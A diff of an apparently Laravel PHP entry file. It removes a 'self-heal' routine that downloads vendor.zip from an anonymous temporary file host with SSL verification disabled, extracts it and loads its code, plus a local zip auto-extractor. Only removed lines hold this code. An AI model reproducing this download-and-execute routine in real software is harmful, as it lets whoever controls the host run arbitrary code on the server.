@@ -17,27 +17,6 @@ if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php'))
     require $maintenance;
 }
 
-// Auto-extract vendor.zip if vendor/autoload.php is missing
-$zipCandidates = [
-    __DIR__ . '/../vendor.zip',
-    __DIR__ . '/vendor.zip',
-    dirname(__DIR__) . '/vendor.zip',
-];
-$targetVendor = __DIR__ . '/../vendor/autoload.php';
-
-if (!file_exists($targetVendor)) {
-    foreach ($zipCandidates as $zipCandidate) {
-        if (file_exists($zipCandidate) && class_exists('ZipArchive')) {
-            $zip = new ZipArchive();
-            if ($zip->open($zipCandidate) === true) {
-                $zip->extractTo(dirname($zipCandidate));
-                $zip->close();
-                break;
-            }
-        }
-    }
-}
-
 $vendorPaths = [
     __DIR__ . '/../vendor/autoload.php',
     __DIR__ . '/../vendor/vendor/autoload.php',
@@ -53,45 +32,6 @@ foreach ($vendorPaths as $path) {
         require $path;
         $loaded = true;
         break;
-    }
-}
-
-if (!$loaded) {
-    // Attempt automatic self-heal by downloading vendor.zip from cloud storage
-    $directZipUrl = 'https://tmpfiles.org/dl/1795192808.0960dc5a1704e50b/wDAWbTf3Yple/vendor.zip';
-    $zipTarget = dirname(__DIR__) . '/vendor.zip';
-    @ini_set('max_execution_time', '300');
-    @ini_set('memory_limit', '512M');
-    
-    $fp = @fopen($zipTarget, 'w+');
-    if ($fp && function_exists('curl_init')) {
-        $ch = curl_init($directZipUrl);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 180);
-        curl_setopt($ch, CURLOPT_FILE, $fp);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_exec($ch);
-        curl_close($ch);
-        fclose($fp);
-    }
-    if ((!file_exists($zipTarget) || filesize($zipTarget) < 10000000)) {
-        @copy($directZipUrl, $zipTarget);
-    }
-    
-    if (file_exists($zipTarget) && filesize($zipTarget) > 10000000 && class_exists('ZipArchive')) {
-        $zip = new ZipArchive();
-        if ($zip->open($zipTarget) === true) {
-            $zip->extractTo(dirname(__DIR__));
-            $zip->close();
-            @unlink($zipTarget);
-            foreach ($vendorPaths as $path) {
-                if (file_exists($path)) {
-                    require $path;
-                    $loaded = true;
-                    break;
-                }
-            }
-        }
     }
 }
 
